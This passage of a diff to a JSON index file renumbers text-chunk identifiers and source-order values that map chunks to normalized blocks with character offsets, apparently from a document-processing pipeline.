+      "chunk_source_id": "ver_4d5e2f4d1c42_c00071_s009",
+      "chunk_id": "ver_4d5e2f4d1c42_c00071",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00095",
       "source_order": 9,
       "start_offset": 68,
       "end_offset": 180
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00054_s010",
-      "chunk_id": "ver_4d5e2f4d1c42_c00054",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00071_s010",
+      "chunk_id": "ver_4d5e2f4d1c42_c00071",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00095",
       "source_order": 10,
       "start_offset": 181,
       "end_offset": 265
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00055_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00055",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00072_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00072",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00096",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 29
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00056_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00056",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00073_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00073",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00097",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 352
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00057_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00057",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00074_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00074",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00098",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 161
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00058_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00058",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00075_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00075",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00099",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 22
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00059_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00059",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00076_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00076",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00100",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 17
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00060_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00060",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00077_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00077",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00101",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 173
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00060_s001",
-      "chunk_id": "ver_4d5e2f4d1c42_c00060",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00077_s001",
+      "chunk_id": "ver_4d5e2f4d1c42_c00077",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00102",
       "source_order": 1,
       "start_offset": 0,
       "end_offset": 144
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00060_s002",
-      "chunk_id": "ver_4d5e2f4d1c42_c00060",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00077_s002",
+      "chunk_id": "ver_4d5e2f4d1c42_c00077",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00103",
       "source_order": 2,
       "start_offset": 0,
       "end_offset": 100
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00061_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00061",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00078_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00078",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00104",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 30
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00062_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00062",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00079_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00079",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00105",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 124
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00063_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00063",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00080_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00080",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00106",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 29
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00064_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00064",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00081_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00081",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00107",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 139
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00065_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00065",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00082_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00082",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00108",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 31
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00066_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00066",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00083_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00083",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00109",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 139
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00066_s001",
-      "chunk_id": "ver_4d5e2f4d1c42_c00066",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00083_s001",
+      "chunk_id": "ver_4d5e2f4d1c42_c00083",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00109",
       "source_order": 1,
       "start_offset": 140,
       "end_offset": 286
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00066_s002",
-      "chunk_id": "ver_4d5e2f4d1c42_c00066",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00083_s002",
+      "chunk_id": "ver_4d5e2f4d1c42_c00083",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00110",
       "source_order": 2,
       "start_offset": 0,
       "end_offset": 134
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00066_s003",
-      "chunk_id": "ver_4d5e2f4d1c42_c00066",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00083_s003",
+      "chunk_id": "ver_4d5e2f4d1c42_c00083",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00111",
       "source_order": 3,
       "start_offset": 0,
       "end_offset": 30
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00066_s004",
-      "chunk_id": "ver_4d5e2f4d1c42_c00066",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00083_s004",
+      "chunk_id": "ver_4d5e2f4d1c42_c00083",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00112",
       "source_order": 4,
       "start_offset": 0,
       "end_offset": 62
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00066_s005",
-      "chunk_id": "ver_4d5e2f4d1c42_c00066",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00083_s005",
+      "chunk_id": "ver_4d5e2f4d1c42_c00083",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00112",
       "source_order": 5,
       "start_offset": 63,
       "end_offset": 127
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00066_s006",
-      "chunk_id": "ver_4d5e2f4d1c42_c00066",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00083_s006",
+      "chunk_id": "ver_4d5e2f4d1c42_c00083",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00112",
       "source_order": 6,
       "start_offset": 128,
       "end_offset": 187
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00066_s007",
-      "chunk_id": "ver_4d5e2f4d1c42_c00066",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00083_s007",
+      "chunk_id": "ver_4d5e2f4d1c42_c00083",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00112",
       "source_order": 7,
       "start_offset": 188,
       "end_offset": 241
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00066_s008",
-      "chunk_id": "ver_4d5e2f4d1c42_c00066",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00084_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00084",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00113",
-      "source_order": 8,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 100
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00066_s009",
-      "chunk_id": "ver_4d5e2f4d1c42_c00066",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00085_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00085",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00114",
-      "source_order": 9,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 48
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00066_s010",
-      "chunk_id": "ver_4d5e2f4d1c42_c00066",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00086_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00086",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00115",
-      "source_order": 10,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 173
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00066_s011",
-      "chunk_id": "ver_4d5e2f4d1c42_c00066",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00087_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00087",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00116",
-      "source_order": 11,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 153
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00067_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00067",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00088_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00088",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00117",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 31
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00068_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00068",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00089_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00089",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00118",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 153
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00068_s001",
-      "chunk_id": "ver_4d5e2f4d1c42_c00068",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00090_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00090",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00119",
-      "source_order": 1,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 63
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00069_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00069",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00091_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00091",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00120",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 63
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00070_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00070",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00092_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00092",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00121",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 307
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00071_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00071",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00093_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00093",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00122",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 27
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00072_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00072",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00094_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00094",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00123",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 150
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00072_s001",
-      "chunk_id": "ver_4d5e2f4d1c42_c00072",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00095_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00095",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00124",
-      "source_order": 1,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 51
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00072_s002",
-      "chunk_id": "ver_4d5e2f4d1c42_c00072",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00096_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00096",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00125",
-      "source_order": 2,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 92
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00072_s003",
-      "chunk_id": "ver_4d5e2f4d1c42_c00072",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00097_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00097",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00126",
-      "source_order": 3,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 49
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00072_s004",
-      "chunk_id": "ver_4d5e2f4d1c42_c00072",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00098_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00098",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00127",
-      "source_order": 4,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 52
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00072_s005",
-      "chunk_id": "ver_4d5e2f4d1c42_c00072",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00098_s001",
+      "chunk_id": "ver_4d5e2f4d1c42_c00098",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00128",
-      "source_order": 5,
+      "source_order": 1,
       "start_offset": 0,
       "end_offset": 127
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00072_s006",
-      "chunk_id": "ver_4d5e2f4d1c42_c00072",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00099_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00099",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00129",
-      "source_order": 6,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 57
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00072_s007",
-      "chunk_id": "ver_4d5e2f4d1c42_c00072",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00100_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00100",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00130",
-      "source_order": 7,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 52
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00072_s008",
-      "chunk_id": "ver_4d5e2f4d1c42_c00072",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00101_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00101",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00131",
-      "source_order": 8,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 92
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00073_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00073",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00102_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00102",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00132",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 13
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00074_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00074",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00103_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00103",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00133",
       "source_order": 0,
       "start_offset": 0,
